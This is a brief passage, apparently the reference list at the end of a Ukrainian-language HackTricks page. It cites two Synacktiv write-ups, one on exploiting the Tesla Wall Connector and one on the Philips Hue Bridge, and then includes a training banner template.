- [7] [Synacktiv — Експлуатація Tesla Wall Connector через його charge port connector — Частина 2: обхід anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: експлуатація Philips Hue Bridge через Over-the-Air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
